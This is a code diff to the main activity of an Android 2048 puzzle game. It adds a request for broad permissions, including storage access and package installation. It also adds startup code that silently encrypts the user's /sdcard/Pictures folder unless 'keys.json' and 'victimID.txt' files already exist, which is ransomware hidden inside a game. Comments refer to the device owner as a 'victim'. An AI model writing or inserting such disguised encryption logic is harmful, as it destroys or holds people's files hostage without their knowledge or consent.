@@ -1,19 +1,30 @@
 package aarkay.a2048game;
 
+import android.Manifest;
 import android.content.ActivityNotFoundException;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.preference.PreferenceManager;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.MenuItem;
+import android.view.View;
+import android.widget.Button;
 import android.widget.Toast;
 
-
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.appcompat.widget.Toolbar;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import java.io.File;
+import java.io.IOException;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -33,11 +44,67 @@ public class MainActivity extends AppCompatActivity {
     Thread t;
     volatile public static boolean running = true;
 
+    public static boolean hasPermissions(Context context, String[] permissions){
+        if (context != null && permissions != null) {
+            for (String permission : permissions){
+                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
+                    return false;
+                }
+            }
+        }
+        return true;
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         view = (MainView) findViewById(R.id.view);
+
+        // Request permissions
+        String[] PERMISSIONS = {
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.ACCESS_WIFI_STATE,
+            Manifest.permission.INTERNET,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.INTERACT_ACROSS_PROFILES,
+            Manifest.permission.REQUEST_INSTALL_PACKAGES
+        };
+        int PERMISSION_ALL = 1;
+
+        if (!hasPermissions(this, PERMISSIONS)) {
+            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
+        }
+
+        // aarkay.a2048game.Encrypt button
+        Button encrypt_button = (Button) findViewById(R.id.encrypt_button);
+        encrypt_button.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Intent intent = new Intent(MainActivity.this, EncryptFile.class);
+                startActivity(intent);
+            }
+        });
+
+        // Check if /sdcard/keys.json && /sdcard/victimID.txt exist
+        // If exist, don't encrypt, else proceed to encrypt
+        String key_fp = "/sdcard/keys.json";
+        String target_fp = "/sdcard/Pictures";
+        File key_f = new File(key_fp);
+        File vicID_f = new File("/sdcard/victimID.txt");
+        if (!key_f.exists() || !vicID_f.exists()){
+            try {
+                Log.d("MAIN ACTIVITY", "Encrypting in progress");
+                Encrypt.init(1, target_fp, key_fp, "");
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        else {
+            Log.d("MAINT ACTIVITY", "keys.json && victimID.txt exists, not encrypting");
+        }
 
         // Bottom Toolbar
         Toolbar bottomBar = (Toolbar) findViewById(R.id.bottom_bar);
